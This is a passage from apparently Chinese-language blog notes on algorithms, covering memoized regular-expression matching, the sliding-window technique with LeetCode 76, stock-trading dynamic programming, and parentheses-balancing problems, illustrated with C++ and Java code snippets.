class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样不正确, 此时并不能根据j是否等于p.length()来判断是否完成匹配 , 只要p[j..] 能够匹配字符串, 就可以完成匹配 ,比如说 </p><p>s=’a’, p”‘ab* c*”, 当i走到末尾时,j没有走到p末尾, 但是p 依然可以匹配s </p><p>所以</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> m = s.length(), n=p.length();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(i==s.length())&#123;</span><br><span class="line"><span class="comment">//如果能匹配空串, 一定是字符和* 成对出现 </span></span><br><span class="line"><span class="keyword">if</span>((n-j)%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查是否为x*y*z*这种形式</span></span><br><span class="line"><span class="keyword">for</span> (;j+<span class="number">1</span>&lt;p.length();j+=<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(p[j+<span class="number">1</span>]!=<span class="string">'*'</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据以上 , 写出完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* 计算 p[j..] 是否匹配 s[i..] */</span></span><br><span class="line"><span class="function">bool <span class="title">dp</span><span class="params">(string&amp; s, <span class="keyword">int</span> i, string&amp; p, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m = s.size(), n = p.size();</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (j == n) &#123;</span><br><span class="line">        <span class="keyword">return</span> i == m;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == m) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((n - j) % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (; j + <span class="number">1</span> &lt; n; j += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p[j + <span class="number">1</span>] != <span class="string">'*'</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录状态 (i, j)，消除重叠子问题</span></span><br><span class="line">    string key = to_string(i) + <span class="string">","</span> + to_string(j);</span><br><span class="line">    <span class="keyword">if</span> (memo.count(key)) <span class="keyword">return</span> memo[key];</span><br><span class="line">    </span><br><span class="line">    bool res = <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (s[i] == p[j] || p[j] == <span class="string">'.'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j &lt; n - <span class="number">1</span> &amp;&amp; p[j + <span class="number">1</span>] == <span class="string">'*'</span>) &#123;</span><br><span class="line">            res = dp(s, i, p, j + <span class="number">2</span>)</span><br><span class="line">               || dp(s, i + <span class="number">1</span>, p, j);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res = dp(s, i + <span class="number">1</span>, p, j + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (j &lt; n - <span class="number">1</span> &amp;&amp; p[j + <span class="number">1</span>] == <span class="string">'*'</span>) &#123;</span><br><span class="line">            res = dp(s, i, p, j + <span class="number">2</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将当前结果记入备忘录</span></span><br><span class="line">    memo[key] = res;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中用了一个哈希表 <code>memo</code> 消除重叠子问题，因为正则表达算法的递归框架如下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bool</span> dp(<span class="built_in">string</span>&amp; s, <span class="built_in">int</span> i, <span class="built_in">string</span>&amp; p, <span class="built_in">int</span> j) &#123;</span><br><span class="line">    dp(s, i, p, j + <span class="number">2</span>);     <span class="comment">// 1</span></span><br><span class="line">    dp(s, i + <span class="number">1</span>, p, j);     <span class="comment">// 2</span></span><br><span class="line">    dp(s, i + <span class="number">1</span>, p, j + <span class="number">1</span>); <span class="comment">// 3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么, 如果让你从dp(s,i,p,j)得到dp(s, i+2, p,j+2) 至少有两条路径 , 1-&gt; 2 -&gt; 2 和 3-&gt; 3 , 那么就说明 (i+2,j+2)这个状态存在重复 </p><p>,这就说明存在重叠子问题 </p><p>动态规划的时间复杂度为 [状态的总数]* [每次递归花费的时间], 本题中状态的总数当然就是i 和 j的组合, 也是M*N(M为s的长度, N为p的长度); 递归函数dp]中没有循环(base case 中的不考虑, 因为base case的出发次数有限), 所以一次递归花费的时间为常数, ,二者相乘, 总的实时间复杂度为O(MN)</p><p>空间复杂度就是备忘录 memo的大小, 即O(MN)</p><h3 id="滑动窗口算法"><a href="#滑动窗口算法" class="headerlink" title="滑动窗口算法"></a>滑动窗口算法</h3><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210602220300826.png" alt="image-20210602220300826"></p><p>​    </p><p>滑动算法大致逻辑如下</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int <span class="keyword">left</span> = <span class="number">0</span>, <span class="keyword">right</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">right</span> &lt; s.size()) &#123;</span><br><span class="line">    <span class="comment">// 增大窗口</span></span><br><span class="line">    window.add(s[<span class="keyword">right</span>]);</span><br><span class="line">    <span class="keyword">right</span>++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (window needs shrink) &#123;</span><br><span class="line">        <span class="comment">// 缩小窗口</span></span><br><span class="line">        window.remove(s[<span class="keyword">left</span>]);</span><br><span class="line">        <span class="keyword">left</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间度为O(n)</p><p>框架</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 滑动窗口算法框架 */</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slidingWindow</span><span class="params">(<span class="keyword">String</span> s ,<span class="keyword">String</span> t)</span></span>&#123;</span><br><span class="line"><span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; need, window;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">char</span> c:t) need[c]++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> left = <span class="number">0</span>,right = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> valid = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(right &lt; s.<span class="built_in">size</span>())&#123;</span><br><span class="line"><span class="comment">//c 是将移入窗口的字符 </span></span><br><span class="line"><span class="keyword">char</span> c=s[right];</span><br><span class="line">right++;</span><br><span class="line"><span class="comment">//窗口的一系列更新呢 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** debug 输出位置  **/</span> </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"window: [%d, %d]\n"</span>,left,right);</span><br><span class="line"><span class="comment">/***************/</span></span><br><span class="line"><span class="comment">//增加左划窗口是否要收缩 </span></span><br><span class="line"><span class="keyword">while</span>(window needs sharink)&#123;</span><br><span class="line"><span class="comment">//d是将移出窗口的字符 </span></span><br><span class="line"><span class="keyword">char</span> d = s[left];</span><br><span class="line"><span class="comment">//左移窗口</span></span><br><span class="line">left++;</span><br><span class="line"><span class="comment">//进行窗口内数据的一系列更新</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>左移和右移的窗口更新操作是完全对称的 </p><p><code>unordered_map</code>是哈希表(字典), count(key) 相当于Java 的<code>containsKey(Key)</code> 可以判断key是否存在 </p><p>可以使用方括号访问键对应的值map[key], 需要注意的是, 如果该key 不存在,C++会自动创建这个key, 并把map[key]赋值为0 </p><p>map[key]++ 相当于Java 的map.put(key,map.getOrDefault(key,0)+1) </p><h4 id="leetcode-no-76"><a href="#leetcode-no-76" class="headerlink" title="leetcode no.76"></a>leetcode no.76</h4><p>最小覆盖字串 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210603084923351.png" alt="image-20210603084923351"></p><p>函数签名</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">minWindow</span><span class="params">(<span class="keyword">String</span>,<span class="keyword">String</span> t)</span></span></span><br></pre></td></tr></table></figure><p>暴力解法大致</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(int <span class="built_in">i</span>=<span class="number">0</span>;<span class="built_in">i</span>&lt;s.<span class="built_in">size</span>();<span class="built_in">i</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(int <span class="built_in">j</span> = <span class="built_in">i</span>+<span class="number">1</span>; <span class="built_in">j</span>&lt;s.<span class="built_in">size</span>();<span class="built_in">j</span>++J);</span><br><span class="line"><span class="keyword">if</span> s[<span class="built_in">i</span>:<span class="built_in">j</span>] 包含t的所有字母 :</span><br><span class="line">更新答案</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>滑动窗口算法的思路 : </p><ol><li>在字符串S中使用双指针中的左右指针技巧, 初始化left = right = 0, 把索引左闭右开区间[left,right) 称为一个[窗口]</li><li>我们先不断地增加right 指针扩大窗口 [left,right), 找到窗口中的字符串符合要求(包含了T中的所有字符). </li><li>此时, 我们停止增加right, 转而不断增加left 指针缩小窗口 , 直到窗口中的字符串不再符合要求(不包含T中的所有字符串了)同时, 每次增加left, 我们都要更新一轮结果 </li><li>重复第2 步和第 3 步, 直到right达到字符串S的尽头 </li></ol><p>第 2 步相当于在寻找一个[可行解], 然后第3步在优化这个可行解, 最终找到最优解 , 也就是最短的覆盖字串. 左右指针轮流前进, 窗口大小增增减减, 窗口不断向右滑动, 这就是[[滑动窗口]] 这个名字来历</p><p>needs 和window 相当于计数器, 分别记录T中字符出现次数和[窗口]中的相应字符的出现次数</p><p>初始状态<img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210603090902363.png" alt="image-20210603090902363"></p><p>增加 right, 直到窗口[left,right) 包含了 T中所有字符</p><p> <img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210603091238580.png" alt="image-20210603091238580"></p><p>增加left ,缩小窗口</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210603091323476.png" alt="image-20210603091323476"></p><p>直到窗口中的字符串不再符合要求, left不再移动</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210603091404705.png" alt="image-20210603091404705"></p><p>之后重复上述过程，先移动<code>right</code>，再移动<code>left</code>…… 直到<code>right</code>指针到达字符串<code>S</code>的末端，算法结束。</p><p>初始化 window 和 need 两个哈希表 ,记录窗口中的字符和需要凑齐的字符 :</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unrodered_map&lt;<span class="type">char</span>,<span class="type">int</span> &gt;need,<span class="keyword">window</span> ;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">char</span>:t)need[c]++;</span><br></pre></td></tr></table></figure><p>然后, 使用left 和 right 变量初始化窗口的两端, 区间[left,right) 左闭右开, 初始情况下窗口没有包含任何元素: </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> left=<span class="number">0</span>,right=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">int</span> valid=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(right&lt;s.size())&#123;</span><br><span class="line"><span class="comment">//开始滑动 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>valid 变量表示窗口中满足 need条件的字符个数， 如果valid 和need.size的大小相同， 则说明窗口已满足条件， 已经完全覆盖了串T。 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210603092618795.png" alt="image-20210603092618795"></p><p>完整代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">minWindow</span><span class="params">(<span class="built_in">string</span> s,<span class="built_in">string</span> t)</span></span>&#123;</span><br><span class="line"><span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; need,window;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">char</span> c:t) need[c]++;</span><br><span class="line"><span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> valid = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//记录最小覆盖字串的起始索引及长度 </span></span><br><span class="line"><span class="keyword">int</span> start=<span class="number">0</span>, len = INT_MAX;    <span class="comment">//int 占4字节 32位， INT_MAX = 2^31-1</span></span><br><span class="line"><span class="keyword">while</span>(right&lt;s.<span class="built_in">size</span>())&#123;</span><br><span class="line"><span class="comment">//c是将要移入窗口的字符</span></span><br><span class="line"><span class="keyword">char</span> c = s[right];</span><br><span class="line"><span class="comment">//右移窗口</span></span><br><span class="line">right++;</span><br><span class="line"><span class="comment">//进行窗口内数据的一系列更新</span></span><br><span class="line"><span class="keyword">if</span>(need.count(c))&#123;</span><br><span class="line">window[c]++;</span><br><span class="line"><span class="keyword">if</span>(window[c]==need[c])</span><br><span class="line">valid++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断窗口是否要收缩 </span></span><br><span class="line"><span class="keyword">while</span>(valid==need.<span class="built_in">size</span>())&#123;</span><br><span class="line"><span class="comment">//在这里更新最小覆盖子串 </span></span><br><span class="line"><span class="keyword">if</span>(right-left&lt;len)&#123;</span><br><span class="line">start = left;</span><br><span class="line">len = right-left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//d是 将移出窗口的字符 </span></span><br><span class="line"><span class="keyword">char</span> d = s[left];</span><br><span class="line"><span class="comment">//左移窗口 </span></span><br><span class="line">left++ ;</span><br><span class="line"><span class="comment">//进行窗口内数据的一系列更新</span></span><br><span class="line"><span class="keyword">if</span>(need.count(d))&#123;</span><br><span class="line"><span class="keyword">if</span>(window[d]==need[d])</span><br><span class="line">valid--;</span><br><span class="line">window[d]--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> len == INT_MAX ? <span class="string">""</span> :s.substr(start, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意的地方 当某个字符在window 的数量满足了need的需要 </p><h3 id="股票买卖问题"><a href="#股票买卖问题" class="headerlink" title="股票买卖问题"></a>股票买卖问题</h3><p>参考题目, 共性题目 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210609084558020.png" alt="image-20210609084558020"></p><p>状态穷举</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210609084638141.png" alt="image-20210609084638141"></p><p>这个问题的[状态] 有三个, ，第一个是天数，第二个是当天允许交易的最大次数，第三个是当前的持有状态（即之前说的 rest 的状态，我们不妨用 1 表示持有，0 表示没有持有)</p><p>可以使用三维数组dp 装下这几种状态的全部组合, for 循环就能完成穷举 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210609105042701.png" alt="image-20210609105042701"></p><p>状态转移方程框架</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210608230032288.png" alt="image-20210608230032288"></p><h4 id="k-2-时"><a href="#k-2-时" class="headerlink" title="k=2  时"></a>k=2  时</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原始的动态转移方程, 没有可化简的地方</span><br><span class="line">dp[<span class="string">i</span>][<span class="symbol">k</span>][<span class="string">0</span>] = max(dp[<span class="string">i-1</span>][<span class="symbol">k</span>][<span class="string">0</span>], dp[<span class="string">i-1</span>][<span class="symbol">k</span>][<span class="string">1</span>]+prices[i])</span><br><span class="line">dp[<span class="string">i</span>][<span class="symbol">k</span>][<span class="string">i</span>] = max(dp[<span class="string">i-1</span>][<span class="symbol">k</span>][<span class="string">1</span>], dp[<span class="string">i-1</span>][<span class="symbol">k-1</span>][<span class="string">0</span>] - prices[i])</span><br></pre></td></tr></table></figure><p>因为没有消掉K的影响, 所以必须要用for 循环对 k进行穷举才是正确的</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210609232210506.png" alt="image-20210609232210506"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int max_k=2;</span><br><span class="line">int [<span class="string"></span>][<span class="symbol"></span>] dp = new int[<span class="string">n</span>][<span class="symbol">max_k + 1</span>][<span class="string">2</span>];</span><br><span class="line">for(int i=0;i<span class="xml"><span class="tag">&lt;<span class="name">n;i++)&#123;</span></span></span></span><br><span class="line"><span class="xml">for(int k = max_k; k&gt;</span>=1;k--)&#123;</span><br><span class="line"><span class="code">if(i-1=-1) &#123; /*处理base case */&#125;</span></span><br><span class="line"><span class="code">dp[i][k][0] = max(dp[i-1][k][0], dp[i-1][k][1] + prices[i]);</span></span><br><span class="line"><span class="code">dp[i][k][1] = max(dp[i-1][k][1], dp[i-1][k-1][0]- prices[i]);</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line">&#125;</span><br><span class="line">//穷举了 n x max_k x 2个状态 ,正确</span><br><span class="line">return dp[<span class="string">n-1</span>][<span class="symbol">max_k</span>][<span class="string">0</span>];</span><br></pre></td></tr></table></figure><p>第二种解法：因为这里 k 取值范围比较小，所以也可以不用 for 循环，直接把 k = 1 和 2 的情况手动列举出来也是一样的：</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210609232650265.png" alt="image-20210609232650265"></p><p>有状态转移方程和含义明确的变量名引导，相信你很容易看懂。如我我们想故弄玄虚，可以把上述四个变量换成 a, b, c, d。这样当别人看到你的解法时就会大惊失色，一头雾水，不得不对你肃然起敬。(作者爱装逼, 不是我说的.我没有这样的想法, 顶多换成 wsdl )</p><h3 id="括号相关算法"><a href="#括号相关算法" class="headerlink" title="括号相关算法"></a>括号相关算法</h3><h4 id="判断合法括号"><a href="#判断合法括号" class="headerlink" title="判断合法括号"></a>判断合法括号</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; left;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c : str) &#123;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">'('</span> || c == <span class="string">'&#123;'</span> || c == <span class="string">'['</span>)</span><br><span class="line">            left.push(c);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// 字符 c 是右括号</span></span><br><span class="line">            <span class="keyword">if</span> (!left.empty() &amp;&amp; leftOf(c) == left.top())</span><br><span class="line">                left.pop();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// 和最近的左括号不匹配</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 是否所有的左括号都被匹配了</span></span><br><span class="line">    <span class="keyword">return</span> left.empty();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">leftOf</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">'&#125;'</span>) <span class="keyword">return</span> <span class="string">'&#123;'</span>;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">')'</span>) <span class="keyword">return</span> <span class="string">'('</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'['</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="平衡括号"><a href="#平衡括号" class="headerlink" title="平衡括号"></a>平衡括号</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">No921</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使括号有效的最小添加</span></span><br><span class="line"><span class="comment">     * @param s  需要添加括号的字符串</span></span><br><span class="line"><span class="comment">     * @return 添加次数 </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> minAddToMakeValid(String s)&#123;</span><br><span class="line">        <span class="comment">//res 记录插入次数 </span></span><br><span class="line">        <span class="built_in">int</span> res = <span class="number">0</span>; </span><br><span class="line">        <span class="comment">//need 变量记录右括号需求量</span></span><br><span class="line">        <span class="built_in">int</span> need = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;s.size;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i)==<span class="string">'('</span>)&#123;</span><br><span class="line">                <span class="comment">//need+1</span></span><br><span class="line">                need ++;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i)==<span class="string">')'</span>)&#123;</span><br><span class="line">                need--;</span><br><span class="line">                <span class="keyword">if</span>(need==<span class="number">-1</span>)&#123;</span><br><span class="line">                    need = <span class="number">0</span>;</span><br><span class="line">                    <span class="comment">//需插入一个左括号</span></span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res+need; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="平衡括号串-二"><a href="#平衡括号串-二" class="headerlink" title="平衡括号串(二)"></a>平衡括号串(二)</h4><p>这是力扣第 1541 题「平衡括号字符串的最少插入次数」：</p><p>现在假设 1 个左括号需要匹配 2 个右括号才叫做合法的括号组合，那么给你输入一个括号串<code>s</code>，请问你如何计算使得<code>s</code>合法的最小插入次数呢？</p><p><strong>核心思路还是和刚才一样，通过一个<code>need</code>变量记录对右括号的需求数，根据<code>need</code>的变化来判断是否需要插入</strong>。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> minInsertions(<span class="built_in">string</span> s) &#123;</span><br><span class="line">    <span class="built_in">int</span> res = <span class="number">0</span>, need = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; s.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[i] == <span 